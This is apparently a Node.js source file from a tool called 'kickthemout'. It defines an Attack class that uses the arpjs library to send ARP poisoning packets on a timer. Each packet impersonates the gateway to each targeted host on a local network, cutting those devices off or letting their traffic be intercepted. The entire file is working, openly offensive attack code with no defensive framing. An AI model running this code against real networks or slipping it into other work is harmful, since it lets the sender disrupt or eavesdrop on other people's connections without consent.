const debug = require('debug')('kickthemout')
const arp = require('arpjs')

class Attack {

  constructor (packetInterval) {
    this.packetInterval = packetInterval || 8000 // recommended every 10 sec
  }

  setInterface (iface) {
    this.iface = iface
    debug('Selecting interface for ARP Spoofing:', this.iface.name)
    arp.setInterface(this.iface.name)
    return this // for method chaining
  }

  setTarget (hosts) {
    this.targets = hosts
    return this // for method chaining
  }

  setPacketInterval (packetInterval) {
    this.packetInterval = packetInterval
  }

  start () {
    if (!this.targets) throw new Error('No target acquired.')
    var self = this

    if (!Array.isArray(this.targets)) this.targets = [this.targets]

    this.runningAttack = setInterval(function(){
      self.targets.forEach(function(target){
        arp.poison(target.ip, self.iface.gateway_ip)
      })
    }, self.packetInterval)

  }

  stop () {
    clearInterval(this.runningAttack)
  }

}

module.exports = Attack
